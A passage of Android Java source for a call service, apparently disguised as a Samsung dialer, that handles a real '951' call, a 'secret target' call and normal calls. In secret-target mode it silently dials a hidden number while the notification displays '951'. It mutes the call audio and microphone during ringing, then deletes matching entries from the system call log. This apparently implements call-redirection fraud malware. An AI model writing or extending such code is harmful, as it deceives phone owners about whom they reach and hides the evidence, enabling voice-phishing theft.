        // ---- Mode 1: Real SIM 951 IVR call ----
        if (activeCallMode == MODE_REAL_951) {
            if (handoffInProgress) {
                // Silent disconnect as we switch to Hold MP3 + secret target: emit NO end/vibrate events!
                return;
            }
            if (state == Call.STATE_NEW || state == Call.STATE_DIALING || state == Call.STATE_CONNECTING) {
                postOrUpdateCallNotification("951", "Dialing...", false, false, 0L);
                launchMainToFront(true);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('dialing');"
                    );
                }
            } else if (state == Call.STATE_ACTIVE) {
                localSoftHoldActive = false;
                pendingHoldAction = "";
                if (secretConnectTimeMs <= 0L) {
                    secretConnectTimeMs = System.currentTimeMillis();
                }
                setSpeakerEnabled(secretSpeakerWanted);
                postOrUpdateCallNotification("951", "Ongoing call", false, true, secretConnectTimeMs);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('active');"
                    );
                }
            } else if (state == Call.STATE_HOLDING) {
                pendingHoldAction = "";
                postOrUpdateCallNotification("951", "On hold", false, false, 0L);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('holding');"
                    );
                }
            } else if (state == Call.STATE_DISCONNECTED) {
                clearForegroundGuards();
                stopCallNotification();
                restoreAudioModeNormal();
                activeCallMode = MODE_NONE;
                if (!cancelledByUser && !secretVibratedEnd) {
                    secretVibratedEnd = true;
                    vibrateCallEvent();
                }
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onReal951StateChanged && window.onReal951StateChanged('disconnected');"
                    );
                }
            }
            return;
        }

        // ---- Mode 2: Secret Target Background Call ----
        if (activeCallMode == MODE_SECRET_TARGET) {
            if (state == Call.STATE_DISCONNECTED) {
                mainHandler.removeCallbacks(twoRingTimeoutRunnable);
                clearForegroundGuards();
                silenceCarrierCallAudio(false);
                restoreAudioModeNormal();
                if (!hiddenTargetNumber.isEmpty()) {
                    scrubHiddenNumberFromSystemCallLog();
                }
                if (!secretModeActive) {
                    if (!secretRemoteEndDispatched) {
                        stopCallNotification();
                    }
                    activeCallMode = MODE_NONE;
                    return;
                }

                if (wasAnsweredLive) {
                    dispatchSecretRemoteEndedOnce();
                } else if (!cancelledByTimeout && !cancelledByUser) {
                    if (MainActivity.currentInstance != null) {
                        MainActivity.currentInstance.notifySecretJs(
                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
                        );
                    }
                } else {
                    stopCallNotification();
                    activeCallMode = MODE_NONE;
                }
                return;
            }

            if (!secretModeActive) return;

            if (state == Call.STATE_NEW || state == Call.STATE_DIALING || state == Call.STATE_RINGING || state == Call.STATE_CONNECTING) {
                silenceCarrierCallAudio(true);
                if (!MainActivity.isActivityForeground) {
                    launchMainToFront(true);
                }
                scheduleForegroundGuards();
                postOrUpdateCallNotification("951", "Ongoing call", false, false, 0L);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                    );
                }
            } else if (state == Call.STATE_ACTIVE) {
                boolean returningFromHold = wasAnsweredLive;
                wasAnsweredLive = true;
                localSoftHoldActive = false;
                pendingHoldAction = "";
                if (secretConnectTimeMs <= 0L) {
                    secretConnectTimeMs = System.currentTimeMillis();
                }
                mainHandler.removeCallbacks(twoRingTimeoutRunnable);
                silenceCarrierCallAudio(false);
                if (!secretVibratedActive) {
                    secretVibratedActive = true;
                    vibrateCallEvent();
                }
                setCallMuted(secretMutedWanted);
                setSpeakerEnabled(secretSpeakerWanted);
                launchMainToFront(true);
                scheduleForegroundGuards();
                postOrUpdateCallNotification("951", "Ongoing call", false, true, secretConnectTimeMs);
                if (MainActivity.currentInstance != null) {
                    if (returningFromHold) {
                        MainActivity.currentInstance.notifySecretJs(
                            "window.onSecretCallHoldChanged && window.onSecretCallHoldChanged(false);"
                        );
                    } else {
                        MainActivity.currentInstance.notifySecretJs(
                            "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                        );
                    }
                }
            } else if (state == Call.STATE_HOLDING) {
                pendingHoldAction = "";
                postOrUpdateCallNotification("951", "On hold", false, false, 0L);
                if (MainActivity.currentInstance != null) {
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onSecretCallHoldChanged && window.onSecretCallHoldChanged(true);"
                    );
                }
            }
            return;
        }

        // ---- Mode 3: Standard Native Normal Call ----
        if (activeCallMode == MODE_NATIVE_NORMAL) {
            if (state == Call.STATE_RINGING) {
                nativeIncoming = true;
                nativeCallStateStr = "ringing";
                acquireScreenWakeLock();
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Incoming call",
                    true,
                    false,
                    0L
                );
                launchMainToFront(true);
                scheduleForegroundGuards();
                pushNativeStateToWeb();
            } else if (state == Call.STATE_NEW || state == Call.STATE_DIALING || state == Call.STATE_CONNECTING) {
                nativeCallStateStr = "dialing";
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Calling...",
                    false,
                    false,
                    0L
                );
                launchMainToFront(true);
                scheduleForegroundGuards();
                pushNativeStateToWeb();
            } else if (state == Call.STATE_ACTIVE) {
                releaseWakeLock();
                localSoftHoldActive = false;
                pendingHoldAction = "";
                if (nativeConnectTimeMs <= 0L) {
                    nativeConnectTimeMs = System.currentTimeMillis();
                }
                nativeCallStateStr = "active";
                if (!nativeVibratedActive) {
                    nativeVibratedActive = true;
                    vibrateCallEvent();
                }
                setSpeakerEnabled(nativeSpeakerWanted);
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "Ongoing call",
                    false,
                    true,
                    nativeConnectTimeMs
                );
                pushNativeStateToWeb();
            } else if (state == Call.STATE_HOLDING) {
                pendingHoldAction = "";
                localSoftHoldActive = false;
                nativeCallStateStr = "holding";
                postOrUpdateCallNotification(
                    displayTitleForNativeCall(),
                    "On hold",
                    false,
                    false,
                    0L
                );
                pushNativeStateToWeb();
            } else if (state == Call.STATE_DISCONNECTED) {
                releaseWakeLock();
                clearForegroundGuards();
                localSoftHoldActive = false;
                pendingHoldAction = "";
                if (!nativeVibratedEnd) {
                    nativeVibratedEnd = true;
                    vibrateCallEvent();
                }
                long durSec = nativeConnectTimeMs > 0L
                    ? Math.max(0L, (System.currentTimeMillis() - nativeConnectTimeMs) / 1000L)
                    : 0L;
                nativeCallStateStr = "disconnected";
                stopCallNotification();
                pushNativeStateToWeb();
                if (MainActivity.currentInstance != null) {
                    String safeNum = (nativeNumber != null ? nativeNumber : "").replace("\\", "\\\\").replace("'", "\\'");
                    String safeLbl = (nativeLabel != null ? nativeLabel : "").replace("\\", "\\\\").replace("'", "\\'");
                    MainActivity.currentInstance.notifySecretJs(
                        "window.onNativeCallEnded && window.onNativeCallEnded('" + safeNum + "','" + safeLbl + "'," + durSec + ");"
                    );
                }
                activeCallMode = MODE_NONE;
                nativeCallStateStr = "idle";
            }
        }
    }

    private String displayTitleForNativeCall() {
        if (nativeLabel != null && !nativeLabel.trim().isEmpty()) {
            return nativeLabel.trim();
        }
        if (nativeNumber != null && !nativeNumber.trim().isEmpty()) {
            return nativeNumber.trim();
        }
        return "Unknown";
    }

    private void updateNativeLabelFromCall(Call call) {
        if (call == null) return;
        try {
            Call.Details d = call.getDetails();
            String handleNum = "";
            if (d != null && d.getHandle() != null) {
                handleNum = d.getHandle().getSchemeSpecificPart();
            }
            if (handleNum == null) handleNum = "";
            nativeNumber = handleNum.trim();

            String contactName = lookupContactDisplayName(nativeNumber);
            if (!contactName.isEmpty()) {
                nativeLabel = contactName;
            } else if (d != null && d.getCallerDisplayName() != null && !d.getCallerDisplayName().trim().isEmpty()) {
                nativeLabel = d.getCallerDisplayName().trim();
            } else {
                nativeLabel = nativeNumber;
            }
        } catch (Throwable ignored) {
        }
    }

    private String lookupContactDisplayName(String phone) {
        if (phone == null || phone.trim().isEmpty()) return "";
        if (Build.VERSION.SDK_INT >= 23
            && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return "";
        }
        Cursor c = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phone.trim()));
            c = getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (c != null && c.moveToFirst()) {
                String name = c.getString(0);
                if (name != null) return name.trim();
            }
        } catch (Throwable ignored) {
        } finally {
            if (c != null) {
                try {
                    c.close();
                } catch (Throwable ignored2) {
                }
            }
        }
        return "";
    }

    private void ensureNotificationChannels() {
        if (Build.VERSION.SDK_INT < 26) return;
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            NotificationChannel incoming = new NotificationChannel(
                CHANNEL_INCOMING_ID,
                "Incoming calls",
                NotificationManager.IMPORTANCE_HIGH
            );
            incoming.setSound(null, null);
            incoming.enableVibration(false);
            incoming.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            nm.createNotificationChannel(incoming);

            NotificationChannel ongoing = new NotificationChannel(
                CHANNEL_ONGOING_ID,
                "Ongoing calls",
                NotificationManager.IMPORTANCE_DEFAULT
            );
            ongoing.setSound(null, null);
            ongoing.enableVibration(false);
            ongoing.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            nm.createNotificationChannel(ongoing);
        } catch (Throwable ignored) {
        }
    }

    private void refreshCallNotification() {
        if (activeCallMode == MODE_NATIVE_NORMAL && currentCall != null) {
            boolean isIn = "ringing".equals(nativeCallStateStr);
            boolean isHeld = "holding".equals(nativeCallStateStr) || localSoftHoldActive;
            String sub = isIn
                ? "Incoming call"
                : (isHeld
                    ? "On hold"
                    : ("active".equals(nativeCallStateStr) ? "Ongoing call" : "Calling..."));
            postOrUpdateCallNotification(
                displayTitleForNativeCall(),
                sub,
                isIn,
                "active".equals(nativeCallStateStr) && !localSoftHoldActive,
                nativeConnectTimeMs
            );
        } else if ((activeCallMode == MODE_REAL_951 || activeCallMode == MODE_SECRET_TARGET) && currentCall != null) {
            int st = getCallStateSafe(currentCall);
            boolean isHeld = st == Call.STATE_HOLDING || localSoftHoldActive;
            String sub = isHeld ? "On hold" : (st == Call.STATE_ACTIVE ? "Ongoing call" : "Dialing...");
            postOrUpdateCallNotification(
                "951",
                sub,
                false,
                st == Call.STATE_ACTIVE && !isHeld && secretConnectTimeMs > 0L,
                secretConnectTimeMs
            );
        }
    }

    @SuppressWarnings("deprecation")
    private void postOrUpdateCallNotification(
        String title,
        String subtitle,
        boolean isIncoming,
        boolean showChronometer,
        long whenMs
    ) {
        try {
            if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            ensureNotificationChannels();

            Intent openUiIntent = new Intent(this, MainActivity.class);
            openUiIntent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK
                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                | Intent.FLAG_ACTIVITY_SINGLE_TOP
            );
            openUiIntent.putExtra("native_call_action", "show");
            PendingIntent fullScreenPi = PendingIntent.getActivity(
                this,
                100,
                openUiIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            Intent answerIntent = new Intent(this, CallNotificationActionReceiver.class);
            answerIntent.setAction(CallNotificationActionReceiver.ACTION_ANSWER_CALL);
            PendingIntent answerPi = PendingIntent.getBroadcast(
                this,
                101,
                answerIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            Intent hangupIntent = new Intent(this, CallNotificationActionReceiver.class);
            hangupIntent.setAction(CallNotificationActionReceiver.ACTION_HANGUP_CALL);
            PendingIntent hangupPi = PendingIntent.getBroadcast(
                this,
                102,
                hangupIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            String channelId = isIncoming ? CHANNEL_INCOMING_ID : CHANNEL_ONGOING_ID;
            Notification.Builder builder = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, channelId)
                : new Notification.Builder(this);

            builder.setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle(title != null && !title.isEmpty() ? title : "Phone")
                .setContentText(subtitle != null ? subtitle : "")
                .setOngoing(true)
                .setAutoCancel(false)
                .setCategory(Notification.CATEGORY_CALL)
                .setVisibility(Notification.VISIBILITY_PUBLIC)
                .setContentIntent(fullScreenPi);

            if (isIncoming) {
                builder.setFullScreenIntent(fullScreenPi, true);
                if (Build.VERSION.SDK_INT < 26) {
                    builder.setPriority(Notification.PRIORITY_MAX);
                }
            }
            if (showChronometer && whenMs > 0L) {
                builder.setUsesChronometer(true);
                builder.setWhen(whenMs);
            }

            if (Build.VERSION.SDK_INT >= 31) {
                Person caller = new Person.Builder()
                    .setName(title != null && !title.isEmpty() ? title : "Phone")
                    .setImportant(true)
                    .build();
                Notification.CallStyle callStyle = isIncoming
                    ? Notification.CallStyle.forIncomingCall(caller, hangupPi, answerPi)
                    : Notification.CallStyle.forOngoingCall(caller, hangupPi);
                builder.setStyle(callStyle);
            } else {
                if (isIncoming) {
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Decline", hangupPi).build()
                    );
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Answer", answerPi).build()
                    );
                } else {
                    builder.addAction(
                        new Notification.Action.Builder(R.mipmap.ic_launcher, "Hang up", hangupPi).build()
                    );
                }
            }

            Notification notif = builder.build();
            try {
                if (Build.VERSION.SDK_INT >= 34) {
                    startForeground(CALL_NOTIF_ID, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_PHONE_CALL);
                } else {
                    startForeground(CALL_NOTIF_ID, notif);
                }
            } catch (Throwable fgErr) {
                try {
                    NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                    if (nm != null) {
                        nm.notify(CALL_NOTIF_ID, notif);
                    }
                } catch (Throwable ignoredNm) {
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void stopCallNotification() {
        try {
            if (Build.VERSION.SDK_INT >= 24) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.cancel(CALL_NOTIF_ID);
            }
            if (MainActivity.currentInstance != null && !hasAnyActiveCall()) {
                MainActivity.currentInstance.refreshCallWindowFlags();
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressLint("WakelockTimeout")
    @SuppressWarnings("deprecation")
    private void acquireScreenWakeLock() {
        try {
            if (screenWakeLock == null) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    screenWakeLock = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                        | PowerManager.ACQUIRE_CAUSES_WAKEUP
                        | PowerManager.ON_AFTER_RELEASE,
                        "SamsungDialer:IncomingCallWakeLock"
                    );
                    screenWakeLock.setReferenceCounted(false);
                }
            }
            if (screenWakeLock != null && !screenWakeLock.isHeld()) {
                screenWakeLock.acquire(45000L);
            }
        } catch (Throwable ignored) {
        }
    }

    private void releaseWakeLock() {
        try {
            if (screenWakeLock != null && screenWakeLock.isHeld()) {
                screenWakeLock.release();
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void vibrateCallEvent() {
        try {
            Vibrator vib = null;
            if (Build.VERSION.SDK_INT >= 31) {
                VibratorManager vm = (VibratorManager) getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                if (vm != null) {
                    vib = vm.getDefaultVibrator();
                }
            }
            if (vib == null) {
                vib = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            }
            if (vib == null || !vib.hasVibrator()) return;
            if (Build.VERSION.SDK_INT >= 26) {
                vib.vibrate(VibrationEffect.createOneShot(95L, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vib.vibrate(95L);
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private int getCallStateSafe(Call call) {
        if (call == null) return Call.STATE_DISCONNECTED;
        try {
            if (Build.VERSION.SDK_INT >= 31) {
                return call.getDetails() != null ? call.getDetails().getState() : call.getState();
            }
            return call.getState();
        } catch (Throwable ignored) {
            return Call.STATE_DISCONNECTED;
        }
    }

    private void silenceCarrierCallAudio(boolean mute) {
        try {
            setMuted(mute);
        } catch (Throwable ignored) {
        }
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setMicrophoneMute(mute);
                if (mute) {
                    if (savedVoiceCallVolume < 0) {
                        savedVoiceCallVolume = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
                    }
                    if (Build.VERSION.SDK_INT >= 23 && !streamVoiceMutedByUs) {
                        try {
                            am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
                            streamVoiceMutedByUs = true;
                        } catch (Throwable ignoredM) {
                        }
                    }
                    try {
                        am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
                    } catch (Throwable ignoredVol) {
                    }
                } else {
                    if (Build.VERSION.SDK_INT >= 23 && streamVoiceMutedByUs) {
                        try {
                            am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
                        } catch (Throwable ignoredU) {
                        }
                        streamVoiceMutedByUs = false;
                    }
                    if (savedVoiceCallVolume >= 0) {
                        int targetVol = savedVoiceCallVolume > 0 ? savedVoiceCallVolume : Math.max(1, am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL) / 2);
                        try {
                            am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, targetVol, 0);
                        } catch (Throwable ignoredR) {
                        }
                        savedVoiceCallVolume = -1;
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    @SuppressWarnings("deprecation")
    private void restoreAudioModeNormal() {
        // Never tear down communication routing while post-call Survey MP3 or standalone 951 audio is active
        if (standaloneAudioActive || NativeAudioEngine.isPlayingCommAudio()) {
            return;
        }
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                if (Build.VERSION.SDK_INT >= 31) {
                    try {
                        am.clearCommunicationDevice();
                    } catch (Throwable ignored) {
                    }
                } else {
                    am.setSpeakerphoneOn(false);
                }
                am.setMicrophoneMute(false);
                am.setMode(AudioManager.MODE_NORMAL);
            }
        } catch (Throwable ignored) {
        }
    }

    private void scrubHiddenNumberFromSystemCallLog() {
        if (hiddenTargetNumber == null || hiddenTargetNumber.isEmpty()) return;
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission(Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        try {
            String digits = hiddenTargetNumber.replaceAll("\\D", "");
            if (digits.length() < 6) return;
            String tail = digits.length() > 7 ? digits.substring(digits.length() - 7) : digits;
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls._ID, CallLog.Calls.NUMBER},
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            );
            if (cursor != null) {
                try {
                    int checked = 0;
                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    while (cursor.moveToNext() && checked < 6) {
                        checked++;
                        String rowId = idIdx >= 0 ? cursor.getString(idIdx) : null;
                        String num = numIdx >= 0 ? cursor.getString(numIdx) : "";
                        String numDigits = num != null ? num.replaceAll("\\D", "") : "";
                        if (rowId != null && !numDigits.isEmpty() && numDigits.endsWith(tail)) {
                            getContentResolver().delete(
                                CallLog.Calls.CONTENT_URI,
                                CallLog.Calls._ID + "=?",
                                new String[]{rowId}
                            );
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (Throwable ignored) {
        }
    }
}
